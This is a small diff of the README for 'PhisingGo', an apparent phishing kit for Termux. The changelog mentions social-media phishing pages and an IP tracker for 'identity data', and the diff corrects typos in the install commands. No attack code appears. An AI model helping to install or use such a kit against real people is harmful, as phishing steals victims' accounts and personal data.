@@ -49,7 +49,7 @@ NB          : Humans are not perfect
 
 ### Changelog:
 Use [ip-tracker](https://www.ip-tracker.org) for identity data.
-phishing pages from using social media page [traditiona](https://github.com/stepbystepexe/PhisingGo/sites) which has been updated
+phishing pages from using social media page [traditional](https://github.com/stepbystepexe/PhisingGo/sites) which has been updated
 
 ### Installation:
 How to install on termux via git.
@@ -60,9 +60,9 @@ cd PhisingGo
 ls
 chmod +x
 ```
-to install all packages run the command
+to install all packages phisinggo run the command
 ```text
-bash install.s
+bash install.sh
 ```
 the last step is to run the command
 ```text
